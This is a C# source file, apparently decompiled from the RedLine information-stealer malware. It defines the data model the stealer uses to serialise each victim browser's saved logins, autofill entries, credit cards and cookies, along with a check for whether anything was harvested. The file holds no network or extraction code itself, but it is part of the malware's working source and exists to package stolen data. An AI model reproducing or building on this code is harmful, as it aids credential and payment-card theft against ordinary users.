using System.Collections.Generic;
using System.Runtime.Serialization;

namespace RedLine.Models.Browsers
{
	[DataContract(Name = "Browser", Namespace = "v1/Models")]
	public class Browser
	{
		[DataMember(Name = "Name")]
		public string Name
		{
			get;
			set;
		}

		[DataMember(Name = "Profile")]
		public string Profile
		{
			get;
			set;
		}

		[DataMember(Name = "Credentials")]
		public IList<LoginPair> Credentials
		{
			get;
			set;
		}

		[DataMember(Name = "Autofills")]
		public IList<Autofill> Autofills
		{
			get;
			set;
		}

		[DataMember(Name = "CreditCards")]
		public IList<CreditCard> CreditCards
		{
			get;
			set;
		}

		[DataMember(Name = "Cookies")]
		public IList<Cookie> Cookies
		{
			get;
			set;
		}

		public bool IsEmpty()
		{
			bool result = true;
			IList<LoginPair> credentials = Credentials;
			if (credentials != null && credentials.Count > 0)
			{
				result = false;
			}
			IList<Autofill> autofills = Autofills;
			if (autofills != null && autofills.Count > 0)
			{
				result = false;
			}
			IList<CreditCard> creditCards = CreditCards;
			if (creditCards != null && creditCards.Count > 0)
			{
				result = false;
			}
			IList<Cookie> cookies = Cookies;
			if (cookies != null && cookies.Count > 0)
			{
				result = false;
			}
			return result;
		}
	}
}
